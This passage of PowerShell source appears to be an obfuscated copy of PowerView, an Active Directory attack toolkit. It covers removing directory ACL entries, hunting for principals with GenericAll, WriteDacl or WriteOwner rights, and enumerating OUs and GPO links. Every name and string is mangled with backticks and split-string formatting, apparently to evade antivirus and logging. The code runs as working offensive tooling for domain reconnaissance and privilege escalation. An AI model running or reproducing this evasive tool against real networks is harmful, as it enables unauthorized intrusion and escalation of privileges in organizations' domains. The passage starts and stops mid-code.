            }

            ForEach (${P`RiNC`I`paloBjeCt} in ${P`RI`NCI`pALs}) {
                &("{4}{1}{0}{3}{2}" -f'e','te-V','se','rbo','Wri') "[Remove-DomainObjectAcl] Removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname) "

                try {
                    ${ID`ENt`ITY} = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${p`R`Inc`iPA`LObJEcT}."OBJ`eC`TSiD")

                    if (${Gu`iDs}) {
                        ForEach (${GU`ID} in ${G`UI`dS}) {
                            ${NeW`guId} = &("{1}{0}{2}" -f'je','New-Ob','ct') ("{1}{0}" -f 'id','Gu') ${g`UId}
                            ${Ad`RIg`HTs} = [System.DirectoryServices.ActiveDirectoryRights] ("{0}{3}{1}{2}" -f'Exte','e','dRight','nd')
                            ${A`CeS} += &("{0}{1}{3}{2}" -f'New-','O','ect','bj') ("{8}{1}{11}{5}{3}{2}{4}{9}{10}{12}{6}{7}{0}"-f 'Rule','s','vice','torySer','s.A','Direc','y','Access','Sy','ct','iveDirec','tem.','tor') ${ID`enTI`Ty}, ${AdRi`g`hTs}, ${C`ONTRolTY`pE}, ${nEWG`U`iD}, ${I`N`heRIt`AnCEtYpe}
                        }
                    }
                    else {

                        ${adr`IGH`TS} = [System.DirectoryServices.ActiveDirectoryRights] ("{2}{0}{1}"-f'ricAl','l','Gene')
                        ${A`cEs} += &("{3}{0}{1}{2}"-f'w','-','Object','Ne') ("{5}{11}{2}{6}{10}{8}{9}{4}{12}{7}{3}{1}{0}"-f 'le','sRu','ect','s','rectory','System.Di','orySer','e','Ac','tiveDi','vices.','r','Acc') ${iD`En`TItY}, ${A`d`Ri`GHts}, ${con`T`RoLTY`Pe}, ${iNHE`RItAnC`eT`YPE}
                    }

                    ForEach (${a`CE} in ${ac`Es}) {
                        &("{0}{4}{2}{3}{1}" -f 'Writ','bose','-Ve','r','e') "[Remove-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname) "
                        ${Ta`R`G`etEnTry} = ${tar`GE`T`O`BJECt}.("{2}{0}{5}{4}{1}{3}"-f 'c','yEntr','GetDire','y','or','t').Invoke()
                        ${Ta`Rg`etE`NtrY}."p`sBasE"."Opti`O`Ns"."s`EC`URITy`mA`sks" = ("{0}{1}"-f'D','acl')
                        ${T`ArGEte`N`TrY}."Ps`BASE"."ObJeC`TsECURI`Ty".("{0}{2}{4}{3}{1}" -f 'Rem','ule','oveAcc','R','ess').Invoke(${A`Ce})
                        ${Ta`Rget`ENtrY}."p`sBASE".("{1}{2}{0}" -f 'es','CommitCha','ng').Invoke()
                    }
                }
                catch {
                    &("{0}{1}{2}" -f 'Write-Ver','bos','e') "[Remove-DomainObjectAcl] Error removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname) : $_ "
                }
            }
        }
    }
}

function fInD-in`T`eRE`ST`InGdOMaInacl {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{4}{3}{2}" -f'S','P','rocess','houldP','S'}, '')]
    [OutputType({"{2}{0}{1}{3}"-f 'rVie','w','Powe','.ACL'})]
    [CmdletBinding()]
    Param (
        [Parameter(PosItION = 0, ValuEFRoMPipelIne = ${T`Rue}, ValUEFroMpipEliNEbyPRopErtyNAMe = ${TR`Ue})]
        [Alias({"{1}{2}{0}"-f'nName','Do','mai'}, {"{1}{0}" -f'e','Nam'})]
        [String]
        ${D`OMaiN},

        [Switch]
        ${r`eSOLvEg`UI`ds},

        [String]
        [ValidateSet('All', {"{4}{2}{3}{0}{1}"-f'wor','d','setPas','s','Re'}, {"{3}{0}{1}{2}"-f 'e','mbe','rs','WriteM'})]
        ${ri`ghtsfIL`TER},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'Fi','lter'})]
        [String]
        ${ld`AP`FilT`ER},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'ADSPat','h'})]
        [String]
        ${sE`ARc`HBASE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{3}{0}{2}" -f 'rolle','Dom','r','ainCont'})]
        [String]
        ${SER`Ver},

        [ValidateSet({"{0}{1}"-f 'B','ase'}, {"{0}{2}{1}" -f 'On','l','eLeve'}, {"{1}{0}"-f 'e','Subtre'})]
        [String]
        ${s`E`Arch`sCope} = ("{1}{0}"-f 'ree','Subt'),

        [ValidateRange(1, 10000)]
        [Int]
        ${Re`sU`ltp`AG`eSIze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`ervertime`lImiT},

        [Switch]
        ${tom`BST`one},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`EDe`NTiaL} =   ( &("{0}{1}{2}{3}" -f'g','e','T-Var','iaBle') ("p"+"kFezn")  -VALUeo )::"e`mPTy"
    )

    BEGIN {
        ${aCLAr`g`UmENts} = @{}
        if (${P`s`B`o`UnDPARAmET`Ers}[("{2}{0}{1}"-f'olve','GUIDs','Res')]) { ${ac`LAr`GumeNtS}[("{2}{0}{3}{1}" -f'ol','UIDs','Res','veG')] = ${RESoLVE`G`Ui`DS} }
        if (${P`sBo`UN`dPa`RAmETeRS}[("{1}{0}{3}{2}"-f 'i','R','lter','ghtsFi')]) { ${acl`ArG`U`meN`TS}[("{0}{3}{1}{2}" -f 'Rights','ilt','er','F')] = ${riGHtsFI`Lt`ER} }
        if (${Psb`OUnDpaRAMET`e`Rs}[("{2}{0}{1}"-f 'i','lter','LDAPF')]) { ${aCl`Arg`U`ME`NtS}[("{1}{2}{0}" -f'r','LDAPF','ilte')] = ${L`Dap`Fi`LTer} }
        if (${pSB`O`U`NdParaMet`erS}[("{0}{3}{1}{2}" -f'Sear','h','Base','c')]) { ${AclaRg`U`meNts}[("{0}{2}{1}"-f 'Se','chBase','ar')] = ${SeARch`B`Ase} }
        if (${P`sbOun`DPa`RA`M`ETeRS}[("{2}{1}{0}"-f 'er','v','Ser')]) { ${ac`Larg`UmEntS}[("{2}{0}{1}"-f 'v','er','Ser')] = ${Se`Rver} }
        if (${Ps`BoUn`DPaRamE`Ters}[("{0}{1}{2}" -f'Sear','chScop','e')]) { ${A`ClAr`gumEn`Ts}[("{0}{1}{2}"-f'SearchS','cop','e')] = ${s`EarchsCo`pE} }
        if (${psboUndPAR`Am`ete`RS}[("{1}{0}{2}"-f 'iz','ResultPageS','e')]) { ${aCL`ARgumE`NtS}[("{2}{1}{4}{0}{3}"-f 'S','ltPag','Resu','ize','e')] = ${re`su`LTpAg`EsiZE} }
        if (${ps`B`OUndPARam`eT`ERs}[("{0}{2}{1}{3}{4}" -f'Se','me','rverTi','Lim','it')]) { ${aC`LaRg`UM`ents}[("{2}{0}{3}{1}{4}" -f'erver','imeLi','S','T','mit')] = ${SE`RVert`IME`LIm`it} }
        if (${pSB`OUnD`p`AramETErS}[("{2}{0}{1}"-f'sto','ne','Tomb')]) { ${A`CLArgume`Nts}[("{1}{0}{2}" -f 'ombston','T','e')] = ${tO`M`BSto`Ne} }
        if (${Ps`B`ounDp`AraMETErS}[("{2}{1}{0}"-f'al','i','Credent')]) { ${A`clAR`GUmen`Ts}[("{2}{3}{0}{1}"-f'i','al','Cre','dent')] = ${crE`d`ENTI`Al} }

        ${OB`JE`ctSeARc`heRar`G`UMeN`Ts} = @{
            ("{0}{2}{1}"-f 'Prop','es','erti') = ("{6}{2}{0}{3}{4}{7}{1}{5}"-f 'accountn','las','m','ame',',','s','sa','objectc')
            'Raw' = ${t`RUe}
        }
        if (${p`sB`oUNdpaRAmeT`ErS}[("{1}{0}"-f 'r','Serve')]) { ${Obje`CTsea`R`chER`ARGUments}[("{0}{1}"-f'Ser','ver')] = ${se`Rv`ER} }
        if (${P`sbo`UNd`PA`RAMeTers}[("{1}{2}{0}"-f'Scope','Se','arch')]) { ${o`BjeC`TseARCh`e`RArgUMenTS}[("{0}{1}{2}" -f 'Se','archScop','e')] = ${SearcH`s`copE} }
        if (${PSbOu`N`DpAraM`e`TerS}[("{1}{2}{3}{0}" -f'geSize','Re','sultP','a')]) { ${ob`jeCtsearCH`Era`R`G`Um`enTS}[("{1}{3}{0}{2}"-f'geSiz','R','e','esultPa')] = ${r`eS`U`LTPAgesi`ze} }
        if (${PsboUn`d`pAr`AmEterS}[("{3}{1}{0}{2}" -f'rv','e','erTimeLimit','S')]) { ${o`BJEctSeaRcH`eRAR`GU`mENts}[("{2}{1}{0}" -f 'TimeLimit','er','Serv')] = ${SER`VER`TIME`LiMIT} }
        if (${P`SboUnd`paRAmET`ErS}[("{1}{0}{3}{2}"-f'mbsto','To','e','n')]) { ${o`BjeCTS`e`ARcHeR`ARgu`meNTs}[("{1}{0}{2}" -f'sto','Tomb','ne')] = ${tO`mbsTo`Ne} }
        if (${p`S`BOUndPAr`A`METErs}[("{0}{2}{1}{3}"-f 'C','ent','red','ial')]) { ${oBJEC`T`SE`A`RCHERar`G`Uments}[("{2}{1}{0}"-f'al','i','Credent')] = ${C`REdEN`TIal} }

        ${A`D`NamEARGum`ents} = @{}
        if (${PsbO`UN`dpa`R`AmeT`erS}[("{1}{0}" -f'rver','Se')]) { ${AdN`AMEAr`g`UmeNTS}[("{0}{1}"-f 'Ser','ver')] = ${SeRV`ER} }
        if (${PSB`oUNDpArAm`ET`E`RS}[("{2}{1}{0}"-f 'ential','red','C')]) { ${adn`AM`E`A`Rgu`mEnts}[("{0}{2}{1}" -f 'Cr','ial','edent')] = ${CrED`e`NTi`Al} }

        ${r`E`s`oLvEDsi`ds} = @{}
    }

    PROCESS {
        if (${p`SbOU`NdPaRame`T`e`Rs}[("{1}{0}" -f 'ain','Dom')]) {
            ${ACL`ARGU`M`EnTS}[("{2}{0}{1}" -f'oma','in','D')] = ${doMa`IN}
            ${adNAMe`ARG`UM`E`N`Ts}[("{1}{0}"-f'main','Do')] = ${DOMa`IN}
        }

        &("{1}{0}{2}{3}" -f '-DomainObject','Get','Ac','l') @ACLArguments | &("{1}{4}{2}{3}{0}" -f'ct','Fo','h','-Obje','rEac') {

            if ( (${_}."actI`VeD`IrecT`oR`yriGhTS" -match ((("{5}{0}{7}{1}{4}{2}{3}{6}"-f'e','Al','NlbD','elet','lNlbWriteNlbCreate','G','e','neric'))-crEpLAcE ([cHAR]78+[cHAR]108+[cHAR]98),[cHAR]124)) -or ((${_}."actI`VEDI`REctorYR`IGH`TS" -match ("{2}{3}{1}{0}"-f't','ndedRigh','E','xte')) -and (${_}."aCequAl`if`iER" -match ("{1}{0}" -f'w','Allo')))) {

                if (${_}."se`cUR`i`TYi`denTIfiER"."V`AlUE" -match '^S-1-5-.*-[1-9]\d{3,}$') {
                    if (${r`e`SolVe`d`sids}[${_}."SEcurITyI`d`eNtiFI`er"."v`ALUE"]) {
                        ${IDEn`TIt`Yr`e`FeRen`cEnA`mE}, ${idENt`I`TyrEFe`R`E`NCEDomAin}, ${iDentITYrEFe`R`EN`C`Edn}, ${iDEnT`iT`yRefErEN`C`ECLA`sS} = ${resOl`VeDs`iDs}[${_}."S`eCuRiTYI`dEnT`IFi`er"."V`ALUE"]

                        ${INTe`Re`sTIn`gA`cl} = &("{0}{2}{1}"-f'New','Object','-') ("{0}{2}{1}" -f 'P','ect','SObj')
                        ${IN`TeRE`StIn`gACl} | &("{1}{2}{0}"-f'mber','Add-M','e') ("{0}{2}{1}{3}"-f'NoteP','r','rope','ty') ("{0}{2}{1}"-f'Object','N','D') ${_}."obje`CTdN"
                        ${I`N`Te`REST`INgaCl} | &("{3}{0}{1}{2}" -f'-M','e','mber','Add') ("{1}{2}{0}{3}" -f 'ert','N','oteProp','y') ("{0}{1}{2}" -f 'AceQua','l','ifier') ${_}."A`CEqUALIf`i`Er"
                        ${Inte`RE`St`In`gaCl} | &("{1}{0}{2}{3}" -f 'dd-M','A','em','ber') ("{0}{1}{2}"-f'NotePr','o','perty') ("{4}{3}{0}{2}{1}{5}"-f 'oryRi','t','gh','ect','ActiveDir','s') ${_}."ACTive`DI`RE`cToRYRIgh`TS"
                        if (${_}."oB`JE`cTacET`yPE") {
                            ${I`Nt`eRest`InGacl} | &("{2}{3}{1}{0}" -f'mber','-Me','A','dd') ("{3}{1}{0}{2}" -f 'pert','tePro','y','No') ("{2}{4}{3}{1}{0}"-f 'ype','T','O','ce','bjectA') ${_}."ObJeCT`AC`EtY`PE"
                        }
                        else {
                            ${I`NtERe`stIn`ga`Cl} | &("{0}{2}{1}{3}" -f'Add-Me','be','m','r') ("{0}{1}{2}"-f 'No','te','Property') ("{3}{1}{0}{2}"-f 'ct','je','AceType','Ob') ("{1}{0}"-f 'ne','No')
                        }
                        ${Int`ereSTi`NgA`Cl} | &("{2}{0}{1}{3}" -f 'Me','mb','Add-','er') ("{2}{0}{1}"-f 'ePropert','y','Not') ("{0}{1}{2}" -f 'Ac','e','Flags') ${_}."Ac`EF`lagS"
                        ${INteR`EsTiNg`A`cL} | &("{0}{1}{2}" -f 'Ad','d-Me','mber') ("{3}{1}{2}{0}"-f'erty','Pr','op','Note') ("{0}{2}{1}"-f 'Ac','pe','eTy') ${_}."AcE`TY`Pe"
                        ${IntER`ESting`AcL} | &("{3}{1}{2}{0}"-f 'r','d-Me','mbe','Ad') ("{2}{3}{1}{0}" -f'y','rt','NotePro','pe') ("{0}{2}{4}{1}{3}"-f 'In','tance','h','Flags','eri') ${_}."inhERITAn`CEF`LA`gS"
                        ${i`NTE`ReSTINGA`cl} | &("{2}{0}{3}{1}"-f'M','mber','Add-','e') ("{1}{2}{0}" -f'erty','No','teProp') ("{4}{1}{5}{0}{3}{2}"-f'f','rityIden','er','i','Secu','ti') ${_}."sec`URITYID`En`TifieR"
                        ${iNTER`e`Sti`N`GAcl} | &("{2}{3}{0}{1}"-f'-Me','mber','Ad','d') ("{2}{1}{0}" -f 'perty','o','NotePr') ("{0}{3}{1}{2}"-f'Identity','erenceN','ame','Ref') ${iDentI`TY`Re`FerEN`CENamE}
                        ${I`N`TeR`eSTInG`Acl} | &("{1}{2}{3}{0}"-f 'r','Ad','d-Memb','e') ("{3}{0}{1}{2}"-f 'e','Prop','erty','Not') ("{2}{0}{4}{1}{3}"-f'ityRefer','eDomai','Ident','n','enc') ${ID`Ent`i`TyR`eFErenC`edO`MaIN}
                        ${inte`Re`sti`NGa`cL} | &("{1}{2}{0}" -f'r','Add-Me','mbe') ("{3}{2}{0}{1}" -f 'er','ty','op','NotePr') ("{3}{2}{0}{1}" -f 'ferenc','eDN','Re','Identity') ${I`denTitYReFeRe`NC`e`dn}
                        ${i`NteREST`I`NGAcL} | &("{0}{2}{1}"-f 'Add-Me','r','mbe') ("{3}{1}{0}{2}"-f't','oper','y','NotePr') ("{2}{4}{1}{3}{0}"-f'lass','rence','Id','C','entityRefe') ${Id`eNtityr`e`FErENC`eCl`A`SS}
                        ${INT`EresTinga`CL}
                    }
                    else {
                        ${I`d`e`Nti`Tyref`ErEN`CEDn} = &("{1}{2}{0}"-f'DName','Conv','ert-A') -Identity ${_}."s`eCu`RityideNti`Fier"."VA`lUE" -OutputType ('DN') @ADNameArguments

                        if (${I`dEntIt`YrEfERenc`Edn}) {
                            ${idEn`T`itYRef`Ere`Nce`dOm`AIN} = ${iDE`N`T`iTyr`efErEn`CeDn}.("{1}{0}{2}" -f'r','SubSt','ing').Invoke(${iDE`N`TItyrEF`EreNcedN}.("{1}{0}" -f'xOf','Inde').Invoke('DC=')) -replace 'DC=','' -replace ',','.'

                            ${o`BJECtsEARChEr`ARguM`E`NTs}[("{1}{0}" -f 'n','Domai')] = ${ide`NTITyref`erEnCeD`OM`A`IN}
                            ${oB`jec`TSeAR`Cher`ArG`UM`eN`Ts}[("{0}{1}{2}"-f 'I','de','ntity')] = ${IDEN`Ti`TyrEfe`R`eNCedN}

                            ${oB`J`eCT} = &("{1}{2}{4}{0}{3}"-f'ec','Ge','t-Doma','t','inObj') @ObjectSearcherArguments

                            if (${OBJe`CT}) {
                                ${i`DE`NTi`TYreFeREnc`eNaME} = ${O`BJE`cT}."pRo`P`ERtI`eS"."SAmaCcO`Untn`A`Me"[0]
                                if (${obj`E`cT}."PRopE`R`TIes"."obJEct`Cl`ASs" -match ("{2}{0}{1}" -f 'omp','uter','c')) {
                                    ${IDeN`TI`TyREfE`RENCecLa`SS} = ("{0}{1}"-f'co','mputer')
                                }
                                elseif (${ObjE`ct}."Prope`R`TIES"."O`BJEc`TcLAss" -match ("{0}{1}"-f 'grou','p')) {
                                    ${ID`E`NT`I`TYrE`Fe`REn`cEclAss} = ("{0}{1}"-f'gro','up')
                                }
                                elseif (${objE`ct}."PRo`perT`iES"."O`Bj`Ec`TclaSs" -match ("{1}{0}" -f 'r','use')) {
                                    ${iDenTi`TYR`e`Fere`NCeC`L`Ass} = ("{0}{1}" -f'u','ser')
                                }
                                else {
                                    ${iDe`N`TItY`REF`Er`ENC`EcLAss} = ${nU`lL}
                                }

                                ${ReSOLV`E`d`sIdS}[${_}."sec`U`Ri`TYiD`EnTIFieR"."v`AlUE"] = ${I`DEnTITyReferE`NCeN`A`Me}, ${ideNT`ITYr`ef`ER`EN`Ce`DOmAiN}, ${Ident`I`Ty`REFeR`enCeDn}, ${iDE`NtityRE`FErence`C`LaSS}

                                ${iNte`RE`STIn`GACl} = &("{0}{1}{2}" -f'New-Obj','e','ct') ("{1}{0}{2}"-f'Ob','PS','ject')
                                ${INtEReS`TI`NgAcL} | &("{2}{1}{0}" -f'er','d-Memb','Ad') ("{0}{2}{1}"-f 'Note','roperty','P') ("{1}{0}"-f 'bjectDN','O') ${_}."obJE`CTDN"
                                ${In`TerE`sT`iNgACL} | &("{2}{1}{0}"-f'r','be','Add-Mem') ("{3}{0}{2}{1}"-f'eProp','y','ert','Not') ("{2}{1}{0}" -f 'ier','ceQualif','A') ${_}."AcE`qu`A`lIfIer"
                                ${IN`T`E`Re`STINGaCL} | &("{1}{0}{2}" -f '-','Add','Member') ("{2}{1}{0}"-f 'operty','otePr','N') ("{2}{3}{1}{0}"-f'yRights','tor','ActiveDi','rec') ${_}."aCT`IvEDIrec`T`oR`y`R`IghTS"
                                if (${_}."oB`jEcTAceTy`PE") {
                                    ${inter`e`ST`iNGa`cL} | &("{1}{2}{0}" -f 'ber','Add','-Mem') ("{0}{3}{2}{1}" -f'No','erty','eProp','t') ("{3}{2}{0}{1}" -f'ctA','ceType','e','Obj') ${_}."oBjECT`Ace`T`yPe"
                                }
                                else {
                                    ${INt`E`ReStIng`Acl} | &("{2}{0}{1}"-f'be','r','Add-Mem') ("{3}{1}{2}{0}"-f 'ty','rop','er','NoteP') ("{0}{1}{2}{3}"-f 'Ob','jectAce','Ty','pe') ("{1}{0}" -f 'one','N')
                                }
                                ${inT`e`Re`sTInGACl} | &("{1}{2}{0}"-f 'er','Add-M','emb') ("{1}{2}{0}"-f'eProperty','No','t') ("{1}{2}{0}"-f'lags','Ac','eF') ${_}."acE`FlAGs"
                                ${in`T`erESt`iNGAcL} | &("{0}{1}{3}{2}"-f 'A','dd-','ember','M') ("{0}{1}{2}" -f'No','teProper','ty') ("{0}{1}"-f'A','ceType') ${_}."AcEt`YpE"
                                ${In`TeRE`S`TInG`ACL} | &("{1}{2}{0}"-f'er','Add-','Memb') ("{2}{0}{1}"-f'otePr','operty','N') ("{1}{0}{3}{2}" -f'her','In','tanceFlags','i') ${_}."in`H`E`R`I`TanCEfLaGs"
                                ${i`N`TERES`TIN`GAcL} | &("{0}{1}{3}{2}"-f'A','dd','er','-Memb') ("{2}{0}{3}{1}"-f'o','rty','NotePr','pe') ("{2}{1}{3}{0}" -f'tifier','curit','Se','yIden') ${_}."S`ECUrItYIdenT`IFi`er"
                                ${I`N`T`ErESt`INgacL} | &("{0}{1}{2}" -f 'A','dd-Membe','r') ("{1}{3}{0}{2}" -f'r','Note','ty','Prope') ("{3}{2}{5}{0}{1}{6}{4}" -f 'yRe','feren','t','Iden','ame','it','ceN') ${ID`En`TityrefERE`N`C`ENa`me}
                                ${InT`ERes`TINgACL} | &("{2}{0}{1}" -f 'dd-Me','mber','A') ("{1}{2}{0}{3}"-f'er','Not','eProp','ty') ("{1}{2}{3}{0}{5}{6}{4}"-f 'efer','Ident','i','tyR','n','ence','Domai') ${ideNtitY`Refe`R`e`Ncedoma`IN}
                                ${I`NTE`R`Est`ingACL} | &("{2}{1}{0}{3}" -f 'e','d-Memb','Ad','r') ("{0}{2}{1}"-f 'NoteP','perty','ro') ("{2}{3}{4}{0}{5}{1}"-f 'en','DN','Ide','ntityR','efer','ce') ${Id`entiTyrEf`eRe`NC`EDN}
                                ${iNt`ereSt`I`NgA`cL} | &("{0}{1}{2}" -f'Add-Memb','e','r') ("{1}{2}{3}{0}" -f 'perty','Note','Pr','o') ("{4}{0}{1}{2}{3}" -f 'enti','tyReferenceC','las','s','Id') ${id`en`T`iTy`REFeR`eNCeCL`ASS}
                                ${INtER`es`T`INGaCl}
                            }
                        }
                        else {
                            &("{0}{1}{2}{3}" -f 'W','rite-Wa','r','ning') "[Find-InterestingDomainAcl] Unable to convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname with Convert-ADName "
                        }
                    }
                }
            }
        }
    }
}

function gE`T`-DOM`AiNou {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{2}{4}{0}{1}"-f 'dP','rocess','SShou','P','l'}, '')]
    [OutputType({"{0}{1}{2}{3}" -f'Pow','e','rVi','ew.OU'})]
    [CmdletBinding()]
    Param (
        [Parameter(PositiOn = 0, vaLuEfrOmPipeline = ${T`RUe}, vAluEfRomPipelineByprOPerTyNaME = ${T`Rue})]
        [Alias({"{0}{1}" -f 'Nam','e'})]
        [String[]]
        ${iD`En`TitY},

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias({"{0}{1}"-f 'G','UID'})]
        ${G`pLi`Nk},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`oMa`iN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}"-f't','er','Fil'})]
        [String]
        ${LDa`P`Fi`LTER},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${p`R`O`peRtIEs},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f 'Path','ADS'})]
        [String]
        ${S`EarCHB`AsE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{3}{0}{4}"-f't','i','Doma','nCon','roller'})]
        [String]
        ${sE`R`VER},

        [ValidateSet({"{1}{0}" -f'e','Bas'}, {"{0}{2}{1}" -f'OneLe','l','ve'}, {"{1}{2}{0}" -f 'ee','Subt','r'})]
        [String]
        ${s`Ear`chsc`OpE} = ("{0}{1}{2}" -f'Sub','tr','ee'),

        [ValidateRange(1, 10000)]
        [Int]
        ${r`eSUL`TPAG`Es`IzE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`e`R`VErtIMel`iMit},

        [ValidateSet({"{1}{0}"-f'l','Dac'}, {"{1}{0}" -f 'oup','Gr'}, {"{0}{1}" -f 'Non','e'}, {"{1}{0}" -f 'r','Owne'}, {"{0}{1}" -f 'S','acl'})]
        [String]
        ${SeC`UrI`Tymas`KS},

        [Switch]
        ${tOMBs`TO`Ne},

        [Alias({"{2}{0}{1}"-f'O','ne','Return'})]
        [Switch]
        ${f`I`NDONE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRE`den`TiAl} =   ( &("{1}{0}" -f 'M','ITe') ('vARI'+'AbLe'+':pkFeZn') )."VA`lue"::"em`pty",

        [Switch]
        ${r`AW}
    )

    BEGIN {
        ${s`eaRcHER`Ar`guM`eNtS} = @{}
        if (${psbO`U`NDPA`RaMeTeRs}[("{1}{0}"-f'ain','Dom')]) { ${seAR`cHe`Rarg`UmE`NTs}[("{0}{1}" -f 'Doma','in')] = ${DOma`iN} }
        if (${pSBo`Undp`ARAME`TerS}[("{1}{0}{2}"-f 'opert','Pr','ies')]) { ${Se`ArCHe`RarGUm`E`NtS}[("{0}{2}{1}" -f'P','rties','rope')] = ${Pr`opeRT`iES} }
        if (${p`sbO`UNd`Pa`RAmeTERs}[("{3}{2}{1}{0}" -f'ase','hB','earc','S')]) { ${SeaR`C`h`E`RA`RgUments}[("{1}{3}{2}{0}" -f'se','Search','a','B')] = ${s`EArC`hbAsE} }
        if (${p`SBOU`NdPa`RaM`Et`Ers}[("{0}{2}{1}"-f'Se','ver','r')]) { ${sEa`RCheR`A`RGum`EnTS}[("{0}{1}" -f 'Ser','ver')] = ${S`e`RveR} }
        if (${PSBOu`N`DPARametE`RS}[("{1}{0}{2}" -f 'hScop','Searc','e')]) { ${Se`ARCHE`RA`Rg`UmenTS}[("{0}{1}{2}"-f'Sear','chSco','pe')] = ${sear`CHSCo`pE} }
        if (${PsboUn`d`PAr`A`meTe`RS}[("{2}{0}{1}{3}"-f'es','u','R','ltPageSize')]) { ${SEaRC`h`erarGuM`eN`Ts}[("{3}{0}{1}{2}" -f 'ltPag','eS','ize','Resu')] = ${R`esu`lT`PagEsIzE} }
        if (${pSB`O`UndpARa`MetErS}[("{1}{0}{2}"-f'rTimeLim','Serve','it')]) { ${SE`AR`ChERa`RGuMeN`TS}[("{1}{0}{3}{2}" -f'e','Serv','mit','rTimeLi')] = ${se`Rv`ErtiM`eLI`MIt} }
        if (${pSB`ouND`PARaM`ET`ERs}[("{1}{2}{0}{3}"-f 'yMas','Se','curit','ks')]) { ${s`EArcH`er`A`RgUM`EnTS}[("{2}{1}{0}{3}"-f 'k','urityMas','Sec','s')] = ${s`ec`URIT`ym`AskS} }
        if (${P`SBoUnD`pAramEtE`Rs}[("{1}{0}{2}" -f 'to','Tombs','ne')]) { ${Sea`R`CHeRARGumE`NTS}[("{0}{1}" -f 'To','mbstone')] = ${T`omBsT`ONe} }
        if (${PSB`ounDPAR`A`meTERS}[("{1}{2}{0}" -f'l','C','redentia')]) { ${SeArcHERA`RG`U`mEnts}[("{1}{2}{0}{3}" -f'nti','Cre','de','al')] = ${CreD`ENT`iaL} }
        ${oUs`earc`H`eR} = &("{2}{0}{1}{3}" -f '-Domain','Searc','Get','her') @SearcherArguments
    }

    PROCESS {
        if (${o`UseAR`CHer}) {
            ${iDE`NT`ItYfILT`eR} = ''
            ${f`ILtER} = ''
            ${Id`eN`TIty} | &("{1}{3}{0}{2}" -f 'Obj','Whe','ect','re-') {${_}} | &("{3}{0}{1}{2}" -f 'Ea','ch-Obje','ct','For') {
                ${IDEn`Ti`TyiN`STaNCe} = ${_}.("{0}{1}{2}" -f'Repla','c','e').Invoke('(', '\28').("{0}{1}" -f'Repla','ce').Invoke(')', '\29')
                if (${IdE`NT`Ity`InSTANce} -match ("{0}{1}"-f '^OU=','.*')) {
                    ${IdE`NT`ITy`F`ilteR} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${PSbo`U`NdparAMet`e`RS}[("{0}{1}"-f 'Doma','in')]) -and (-not ${p`sBOuNdpa`RAMe`Ters}[("{0}{3}{2}{1}" -f'Se','e','Bas','arch')])) {

                        ${IDEn`TItydOM`A`in} = ${iD`eNtityinsT`An`CE}.("{2}{0}{1}" -f 'ubStr','ing','S').Invoke(${i`DENtI`T`YiNSt`A`Nce}.("{0}{1}"-f 'Inde','xOf').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{3}{1}{0}{2}" -f'er','e-V','bose','Writ') ('['+'Get'+'-Doma'+'inOU] '+'Extr'+'ac'+'te'+'d '+'do'+'m'+'ain '+"'$IdentityDomain' "+'f'+'rom '+"'$IdentityInstance'")
                        ${sEarcHer`A`Rgum`En`Ts}[("{1}{0}" -f 'in','Doma')] = ${IdEn`TIty`dO`MAIN}
                        ${O`UsE`Arch`er} = &("{2}{0}{3}{1}" -f'et-','cher','G','DomainSear') @SearcherArguments
                        if (-not ${Ou`SeAr`cHEr}) {
                            &("{3}{0}{2}{1}"-f'i','rning','te-Wa','Wr') ('[G'+'et-D'+'omain'+'OU] '+'Un'+'a'+'ble '+'to'+' '+'ret'+'r'+'ieve '+'dom'+'ain '+'sea'+'rcher'+' '+'for'+' '+"'$IdentityDomain'")
                        }
                    }
                }
                else {
                    try {
                        ${GuId`BYt`eST`Ring} = (-Join (([Guid]${I`D`ENtIt`YInS`TAncE}).("{1}{0}{2}"-f'teAr','ToBy','ray').Invoke() | &("{0}{1}{2}{3}{4}" -f 'ForE','ach-Obj','e','c','t') {${_}.("{0}{1}" -f'ToStrin','g').Invoke('X').("{0}{1}"-f'PadLef','t').Invoke(2,'0')})) -Replace (("{1}{0}"-f'..)','(')),'\$1'
                        ${i`d`en`TITyfIlTeR} += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        ${I`d`E`NTItyFiLteR} += "(name=$IdentityInstance)"
                    }
                }
            }
            if (${IdE`NTI`Tyf`iLT`ER} -and (${IDEnT`ityFiL`T`Er}.("{0}{1}"-f 'T','rim').Invoke() -ne '') ) {
                ${Fi`Lt`er} += "(|$IdentityFilter)"
            }

            if (${p`sb`oU`NdpaRA`MeTerS}[("{0}{1}"-f 'GPL','ink')]) {
                &("{3}{2}{1}{0}" -f'se','-Verbo','e','Writ') ('[Get-Do'+'m'+'ainO'+'U] '+'Sea'+'rch'+'ing '+'fo'+'r '+'OU'+'s '+'wit'+'h '+"$GPLink "+'se'+'t '+'i'+'n '+'t'+'he '+'gpLink'+' '+'pro'+'perty')
                ${F`i`LTEr} += "(gplink=*$GPLink*)"
            }

            if (${Psb`ounD`PA`RaMe`T`erS}[("{0}{2}{1}"-f 'LDA','Filter','P')]) {
